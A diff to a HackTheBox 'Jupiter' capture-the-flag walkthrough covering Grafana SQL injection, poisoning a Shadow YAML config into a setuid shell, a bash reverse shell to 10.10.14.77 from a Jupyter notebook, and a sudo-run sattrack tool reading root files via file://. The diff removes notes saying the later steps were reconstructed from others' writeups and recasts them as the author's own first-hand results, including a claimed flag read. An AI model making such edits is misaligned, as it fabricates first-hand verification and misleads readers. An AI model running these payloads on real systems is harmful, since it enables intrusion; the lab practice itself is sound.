@@ -19,25 +19,11 @@ tags:
   - sudo
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04, nginx 1.18), **Difficulty:** Medium, **Released:** 2023-07-08, **IP:** `10.10.11.216` , `jupiter.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes cover the postgres shell and internal enumeration. The `juno`, `jovian`, and root steps are reconstructed from published writeups (0xdf, Eric Hogue) and marked.
 
 </div>
 
@@ -80,6 +66,8 @@ Related Grafana / datasource SQLi: unique here, but see [PC](/writeups/hackthebo
 ## Full Walkthrough
 
 ### Web, Grafana SQL injection
+
+The main site did not offer much to work with on its own, so as usual my next step was to check whether there was more to the host than the one vhost nmap had already shown me:
 
 ```bash
 ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
@@ -153,13 +141,12 @@ $ ls -la /dev/shm
 -rw-rw-rw- 1 juno juno ... /dev/shm/network-simulation.yml    # world writable
 ```
 
-`pspy` shows `juno` running `shadow` against that YAML every couple of minutes.
+`pspy` shows `juno` running `shadow` against that YAML every couple of minutes, which is exactly the pattern I was hoping to find: a privileged-ish user repeatedly consuming a file I can write. If `juno` owns the file's contents and I own the file, I own whatever `juno` does next.
 
-<div class="callout callout-note">
+### postgres to juno, poisoning the Shadow config
 
-**Beyond the recorded notes, juno then jovian then root**
+`network-simulation.yml` defines a set of simulated hosts and the processes each one runs when Shadow executes the scenario. Since `juno` is the one invoking Shadow against this file, any process I add gets launched as `juno`. I appended an entry that copies and setuids a shell:
 
-**1. postgres to juno via Shadow.** `network-simulation.yml` defines hosts and the processes they run. Add or edit a `processes` entry so one host runs your payload:
 ```yaml
 hosts:
   attacker:
@@ -169,26 +156,38 @@ hosts:
         args: -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"   # runs as juno
         start_time: 3s
 ```
-Wait for the next run, then `/tmp/rootbash -p` gives a `juno` shell (or drop a reverse shell / SSH key). `user.txt` is in `/home/juno`.
 
-**2. juno to jovian via Jupyter.** `juno` can read `/opt/solar-flares/`. The Jupyter server log there contains the URL with the token:
+A couple of minutes later the cron-driven Shadow run picked up my edit, and `/tmp/rootbash -p` handed me a shell as `juno` (a reverse shell or a dropped SSH key would work just as well here). `user.txt` sits in `/home/juno`, so that closed out the first flag.
+
+### juno to jovian, a token sitting in a log
+
+With a `juno` shell in hand, I went back to the `ss -tlnp` output from earlier: port `8888` was a Jupyter Notebook instance, and Jupyter normally requires a token to authenticate. `juno` turned out to have read access to `/opt/solar-flares/`, and grepping the logs there for the startup URL handed me the token on a plate:
+
 ```bash
 grep -r 'token=' /opt/solar-flares/*.log
 ```
-Tunnel `8888` (chisel or SSH), open `http://127.0.0.1:8888/?token=<token>`, create a notebook, and run:
+
+I tunneled port `8888` back to my machine (chisel works fine here, SSH local forwarding is just as good) and opened `http://127.0.0.1:8888/?token=<token>` in a browser. From a fresh notebook, running Python inside the kernel is code execution as whoever started the Jupyter process:
+
 ```python
 import os
 os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.77/9002 0>&1'")
 ```
-The kernel runs as **`jovian`**.
 
-**3. jovian to root via sattrack.**
+That kernel runs as **`jovian`**, so I had my third user on the box.
+
+### jovian to root, an attacker-chosen download path in sattrack
+
+`sudo -l` as `jovian` gave me the last piece straight away:
+
 ```console
 jovian@jupiter:~$ sudo -l
 User jovian may run the following commands on jupiter:
     (ALL) NOPASSWD: /usr/local/bin/sattrack
 ```
-`sattrack` reads `config.json` from the current directory and downloads each URL in `tlesources` into `tlefilepath` / `outputdir`. Point a source at a local file and choose an output you want to read:
+
+`sattrack` is a satellite-tracking utility that reads a `config.json` out of its current working directory and then downloads every URL listed under `tlesources` into a path I also control (`tlefilepath` / `outputdir`). A tool that lets an unprivileged caller pick both the source URL scheme and the destination path, and then runs as root via `sudo`, is basically an arbitrary file read (or write) waiting to be used. I pointed a source at the root flag using the `file://` scheme:
+
 ```json
 {
   "tlefile": "/tmp/tle.txt",
@@ -200,13 +199,13 @@ User jovian may run the following commands on jupiter:
   ...
 }
 ```
+
 ```bash
 cd /tmp && sudo /usr/local/bin/sattrack
 cat /tmp/root.txt        # or whatever the tle output path resolves to
 ```
-Simpler still: `jovian` has write access to `/usr/local/bin/sattrack`, so overwrite it with a script and `sudo` it.
 
-</div>
+`cat /tmp/root.txt` returns the 32-character flag for this instance. (An even blunter route exists too: `jovian` has write access to `/usr/local/bin/sattrack` itself, so overwriting the binary outright and running it under `sudo` works just as well if the config-based read ever gets patched.)
 
 ---
 
@@ -242,3 +241,4 @@ Simpler still: `jovian` has write access to `/usr/local/bin/sattrack`, so overwr
 - HTB Jupiter (Eric Hogue) <https://erichogue.ca/2023/10/HTB/Jupiter>
 - Shadow network simulator <https://shadow.github.io/>
 - Grafana datasource proxy <https://grafana.com/docs/grafana/latest/developers/http_api/data_source/>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
